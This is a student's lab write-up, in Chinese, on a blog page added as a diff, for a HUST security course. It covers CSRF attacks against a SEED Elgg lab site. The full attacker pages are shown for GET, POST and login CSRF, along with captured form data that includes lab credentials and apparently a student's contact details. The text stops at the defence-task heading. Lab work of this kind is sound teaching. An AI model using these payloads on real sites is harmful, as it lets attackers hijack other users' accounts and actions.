@@ -1,0 +1,655 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HUST Information System Security Lab3-Web Security | Life is not a race, but a journey</title><meta name="author" content="Xiang Li"><meta name="copyright" content="Xiang Li"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Operation process record for HUST Information System Security Lab3">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HUST Information System Security Lab3-Web Security">
+<meta property="og:url" content="https://xloverflow.github.io/zh/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab3-Web%20Security/index.html">
+<meta property="og:site_name" content="Life is not a race, but a journey">
+<meta property="og:description" content="Operation process record for HUST Information System Security Lab3">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-416f1b8d4133d67e746a67adbb40f508_720w.png">
+<meta property="article:published_time" content="2024-09-26T15:04:15.000Z">
+<meta property="article:modified_time" content="2026-02-15T05:04:17.032Z">
+<meta property="article:author" content="Xiang Li">
+<meta property="article:tag" content="Study Notes">
+<meta property="article:tag" content="Course Experiments">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.zhimg.com/80/v2-416f1b8d4133d67e746a67adbb40f508_720w.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HUST Information System Security Lab3-Web Security",
+  "url": "https://xloverflow.github.io/zh/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab3-Web%20Security/",
+  "image": "https://pic1.zhimg.com/80/v2-416f1b8d4133d67e746a67adbb40f508_720w.png",
+  "datePublished": "2024-09-26T15:04:15.000Z",
+  "dateModified": "2026-02-15T05:04:17.032Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Xiang Li",
+      "url": "https://xloverflow.github.io/zh"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/zh/img/favicon.png"><link rel="canonical" href="https://xloverflow.github.io/zh/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab3-Web%20Security/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/zh/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/zh/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HUST Information System Security Lab3-Web Security',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://pica.zhimg.com/80/v2-b6830c2136b7784c0aba649af7ec2867_1440w.jpeg" onerror="this.onerror=null;this.src='/zh/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/zh/archives/"><div class="headline">文章</div><div class="length-num">47</div></a><a href="/zh/tags/"><div class="headline">标签</div><div class="length-num">62</div></a><a href="/zh/categories/"><div class="headline">分类</div><div class="length-num">18</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/zh/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/zh/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/zh/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/zh/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/zh/List/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/zh/List/gallery/"><i class="fa-fw fa fa-image"></i><span> 相册</span></a></li><li><a class="site-page child" href="/zh/List/movies/"><i class="fa-fw fas fa-video"></i><span> 视频</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/zh/books/"><i class="fa-fw fas fa-book"></i><span> 书籍</span></a></div><div class="menus_item"><a class="site-page" href="/zh/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/zh/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://pic1.zhimg.com/80/v2-416f1b8d4133d67e746a67adbb40f508_720w.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/zh/"><span class="site-name">Life is not a race, but a journey</span></a><a class="nav-page-title" href="/zh/"><span class="site-name">HUST Information System Security Lab3-Web Security</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/zh/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/zh/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/zh/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/zh/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/zh/List/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/zh/List/gallery/"><i class="fa-fw fa fa-image"></i><span> 相册</span></a></li><li><a class="site-page child" href="/zh/List/movies/"><i class="fa-fw fas fa-video"></i><span> 视频</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/zh/books/"><i class="fa-fw fas fa-book"></i><span> 书籍</span></a></div><div class="menus_item"><a class="site-page" href="/zh/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/zh/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><!-- Language switch button styled like menu item--><div class="menus_items lang-switch"><div class="menus_item"><a class="site-page lang-toggle" href="/"><i class="fas fa-language fa-fw"></i><span> English</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">HUST Information System Security Lab3-Web Security</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-09-26T15:04:15.000Z" title="发表于 2024-09-26 11:04:15">2024-09-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-02-15T05:04:17.032Z" title="更新于 2026-02-15 00:04:17">2026-02-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/zh/categories/HUST-%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">HUST 实验报告</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="信息系统安全实验3记录">信息系统安全实验3记录</h1>
+<h2
+id="跨站请求伪造csrf攻击实验"><strong>跨站请求伪造（CSRF）攻击实验</strong></h2>
+<h3 id="任务-1基于-get-请求的-csrf-攻击"><strong>任务 1：基于 GET 请求的
+CSRF 攻击</strong></h3>
+<p>使用 samy 登录，发送添加好友命令，获取 URL。HTTP Header Live
+插件窗口捕获的数据包如图所示：</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619220223319.png"
+alt="image-20240619220223319" />
+<figcaption aria-hidden="true">image-20240619220223319</figcaption>
+</figure>
+<p>由此我们可以知道 GET 请求的结构是
+http://www.csrflabelgg.com/action/friends/add?friend=id，所以现在我们需要获取
+Samy 的 ID 号码。通过尝试为 Samy
+创建一个新界面，我们可以看到红色高亮部分 45 是 Samy 的 ID。</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619221713999.png"
+alt="image-20240619221713999" />
+<figcaption aria-hidden="true">image-20240619221713999</figcaption>
+</figure>
+<p>在攻击者网站下创建 get_csrf.html</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /var/www/CSRF/Attacker/get_csrf.html</span><br></pre></td></tr></table></figure>
+<p>写入以下内容</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF_GET<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    Alice, you&#x27;re my friend now!</span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://www.csrflabelgg.com/action/friends/add?friend=45&quot;</span>/&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span>  </span><br></pre></td></tr></table></figure>
+<p>Samy 向 Alice 发送了一封邮件，诱使 Alice 点击恶意链接
+http://www.csrflabattacker.com/get_csrf.html</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619224208937.png"
+alt="image-20240619224208937" />
+<figcaption aria-hidden="true">image-20240619224208937</figcaption>
+</figure>
+<p>登录 Alice 的账户查看邮件并访问恶意网页，捕获到的 GET
+请求数据包添加了用户 ID 45，即 Samy，然后检查活动界面发现 Alice 添加了
+Samy 为好友。</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619224651139.png"
+alt="image-20240619224651139" />
+<figcaption aria-hidden="true">image-20240619224651139</figcaption>
+</figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619224818367.png"
+alt="image-20240619224818367" />
+<figcaption aria-hidden="true">image-20240619224818367</figcaption>
+</figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619224859567.png"
+alt="image-20240619224859567" />
+<figcaption aria-hidden="true">image-20240619224859567</figcaption>
+</figure>
+<h3 id="任务-2使用-post-请求的-csrf-攻击"><strong>任务 2：使用 POST
+请求的 CSRF 攻击</strong></h3>
+<p>仍然先登录 Samy 的账户，然后修改个人主页，进行 POST
+请求数据包捕获，得到以下结果。</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619230611400.png"
+alt="image-20240619230611400" />
+<figcaption aria-hidden="true">image-20240619230611400</figcaption>
+</figure>
+<p>POST 请求发送到
+http://www.csrflabelgg.com/action/profile/edit，提交的表单内容如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__elgg_token=2G9AraT4cb7pPqONMfz3sQ</span><br><span class="line">&amp;__elgg_ts=<span class="number">1718837884</span></span><br><span class="line">&amp;name=Samy</span><br><span class="line">&amp;description=&lt;p&gt;A Hacker&lt;/p&gt;</span><br><span class="line">&amp;accesslevel[description]=<span class="number">2</span></span><br><span class="line">&amp;briefdescription=Student</span><br><span class="line">&amp;accesslevel[briefdescription]=<span class="number">2</span></span><br><span class="line">&amp;location=Wuhan</span><br><span class="line">&amp;accesslevel[location]=<span class="number">2</span></span><br><span class="line">&amp;interests=Football</span><br><span class="line">&amp;accesslevel[interests]=<span class="number">2</span></span><br><span class="line">&amp;skills=python</span><br><span class="line">&amp;accesslevel[skills]=<span class="number">2</span></span><br><span class="line">&amp;contactemail=U202112149@hust.edu.cn</span><br><span class="line">&amp;accesslevel[contactemail]=<span class="number">2</span></span><br><span class="line">&amp;phone=<span class="number">19907121291</span></span><br><span class="line">&amp;accesslevel[phone]=<span class="number">2</span></span><br><span class="line">&amp;mobile=<span class="number">19907121291</span></span><br><span class="line">&amp;accesslevel[mobile]=<span class="number">2</span></span><br><span class="line">&amp;website=https://strivelee.top</span><br><span class="line">&amp;accesslevel[website]=<span class="number">2</span></span><br><span class="line">&amp;twitter=lixiang21</span><br><span class="line">&amp;accesslevel[twitter]=<span class="number">2</span></span><br><span class="line">&amp;guid=<span class="number">45</span></span><br></pre></td></tr></table></figure>
+<p>根据这个请求格式，Alice 的 guid 知道是 43，尝试使用 POST 请求进行
+CSRF 攻击。</p>
+<p>首先在攻击者网站下创建 get_csrf.html</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /var/www/CSRF/Attacker/post_csrf.html</span><br></pre></td></tr></table></figure>
+<p>写入以下内容：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF_POST<span class="tag">&lt;/<span class="name">title</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>  </span><br><span class="line">Alice, your profile has changed!</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span>  </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fetch</span>(<span class="string">&#x27;http://www.csrflabelgg.com/action/profile/edit&#x27;</span>, &#123;  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">headers</span>: &#123;  </span></span><br><span class="line"><span class="language-javascript">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>  </span></span><br><span class="line"><span class="language-javascript">        &#125;,  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">guid</span>:<span class="number">42</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">description</span>:<span class="string">&quot;&lt;p&gt;Samy is my hero&lt;/p&gt;&quot;</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">briefdescription</span>:<span class="string">&quot;I&#x27;m Samy&quot;</span>,   </span></span><br><span class="line"><span class="language-javascript">        &#125;)  </span></span><br><span class="line"><span class="language-javascript">    &#125;)  </span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>Samy 向 Alice 发送了一封邮件，诱使 Alice 点击恶意链接
+http://www.csrflabattacker.com/post_csrf.html</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619232506107.png"
+alt="image-20240619232506107" />
+<figcaption aria-hidden="true">image-20240619232506107</figcaption>
+</figure>
+<p>登录 Alice 的账户，然后查看并点击邮件中的链接。</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619232629475.png"
+alt="image-20240619232629475" />
+<figcaption aria-hidden="true">image-20240619232629475</figcaption>
+</figure>
+<p>我们可以看到“关于我”部分已成功修改，POST
+请求数据包被捕获，与现象一致。</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619232821090.png"
+alt="image-20240619232821090" />
+<figcaption aria-hidden="true">image-20240619232821090</figcaption>
+</figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620230509435.png"
+alt="image-20240620230509435" />
+<figcaption aria-hidden="true">image-20240620230509435</figcaption>
+</figure>
+<h3 id="任务-3实现登录-csrf-攻击"><strong>任务 3：实现登录 CSRF
+攻击</strong></h3>
+<p>首先捕获登录请求数据包，相应的请求方法为 POST，URL 为
+http://www.csrflabelgg.com/action/login，请求表单包含用户名和密码，均为明文。</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620164209052.png"
+alt="image-20240620164209052" />
+<figcaption aria-hidden="true">image-20240620164209052</figcaption>
+</figure>
+<p>表单数据内容如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__elgg_token=5ovl8du9mM-5V1rwIDhJsg</span><br><span class="line">__elgg_ts=<span class="number">1718872774</span></span><br><span class="line">username=Samy</span><br><span class="line">password=seedsamy</span><br></pre></td></tr></table></figure>
+<p>首先在攻击者网站下创建 get_csrf.html</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /var/www/CSRF/Attacker/post_csrf.html</span><br></pre></td></tr></table></figure>
+<p>写入以下内容：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF_Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>  </span><br><span class="line">Alice, here is a CSRF_Login attack!  </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span>  </span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 发送 POST 请求  </span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 带上 cookie  </span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fetch</span>(<span class="string">&#x27;http://www.csrflabelgg.com/action/login&#x27;</span>, &#123;  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">headers</span>: &#123;  </span></span><br><span class="line"><span class="language-javascript">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>  </span></span><br><span class="line"><span class="language-javascript">        &#125;,  </span></span><br><span class="line"><span class="language-javascript">       <span class="comment">// 传递参数  </span></span></span><br><span class="line"><span class="language-javascript">        <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">username</span>:<span class="string">&quot;samy&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">password</span>:<span class="string">&quot;seedsamy&quot;</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">persistent</span>:<span class="literal">true</span>,    </span></span><br><span class="line"><span class="language-javascript">        &#125;)  </span></span><br><span class="line"><span class="language-javascript">    &#125;)  </span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>Samy 向 Alice 发送了一封邮件，诱使 Alice 点击恶意链接
+http://www.csrflabattacker.com/login_csrf.html</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620222327448.png"
+alt="image-20240620222327448" />
+<figcaption aria-hidden="true">image-20240620222327448</figcaption>
+</figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620223041289.png"
+alt="image-20240620223041289" />
+<figcaption aria-hidden="true">image-20240620223041289</figcaption>
+</figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620223149485.png"
+alt="image-20240620223149485" />
+<figcaption aria-hidden="true">image-20240620223149485</figcaption>
+</figure>
+<h3 id="任务-4防御策略"><strong>任务 4：防御策略</strong></h3>
